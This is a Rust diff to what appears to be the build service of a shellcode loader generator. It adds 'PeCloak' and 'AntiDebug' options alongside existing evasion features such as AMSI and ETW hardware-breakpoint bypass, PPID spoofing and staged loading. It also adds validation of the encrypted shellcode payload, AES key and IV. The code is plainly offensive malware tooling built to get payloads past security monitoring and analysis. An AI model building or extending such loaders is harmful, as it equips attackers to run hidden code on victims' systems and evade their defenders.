@@ -95,6 +95,8 @@ fn run_build(
             "PpidSpoof"        => Some(Feature::PpidSpoof),
             "AmsiHwbp"         => Some(Feature::AmsiHwbp),
             "EtwHwbp"          => Some(Feature::EtwHwbp),
+            "PeCloak"          => Some(Feature::PeCloak),
+            "AntiDebug"        => Some(Feature::AntiDebug),
             "PeSpoofing"       => Some(Feature::PeSpoofing),
             "Staged"           => Some(Feature::Staged),
             "AppDomain"        => Some(Feature::AppDomain),
@@ -111,13 +113,34 @@ fn run_build(
         }
     };
 
+    fn is_valid_hex(s: &str) -> bool {
+        !s.is_empty() && s.len() % 2 == 0 && s.bytes().all(|b| b.is_ascii_hexdigit())
+    }
+
+    let sc_hex  = req.shellcode_hex.replace(' ', "");
+    let key_hex = req.key_hex.replace(' ', "");
+    let iv_hex  = req.iv_hex.replace(' ', "");
+
+    if !is_valid_hex(&sc_hex) || sc_hex.len() > 2_000_000 {
+        jobs.set_status(&job_id, JobStatus::Error { msg: "shellcode_hex: invalid or exceeds 1MB".into() });
+        return;
+    }
+    if key_hex.len() != 64 || !is_valid_hex(&key_hex) {
+        jobs.set_status(&job_id, JobStatus::Error { msg: "key_hex must be exactly 64 hex chars (32 bytes)".into() });
+        return;
+    }
+    if iv_hex.len() != 32 || !is_valid_hex(&iv_hex) {
+        jobs.set_status(&job_id, JobStatus::Error { msg: "iv_hex must be exactly 32 hex chars (16 bytes)".into() });
+        return;
+    }
+
     let loader_cfg = LoaderConfig {
         loader_type,
         features,
         encryption,
-        shellcode_hex:    req.shellcode_hex.replace(' ', ""),
-        key_hex:          req.key_hex.replace(' ', ""),
-        iv_hex:           req.iv_hex.replace(' ', ""),
+        shellcode_hex:    sc_hex,
+        key_hex,
+        iv_hex,
         pe_config:        None,
         appdomain_config: None,
     };
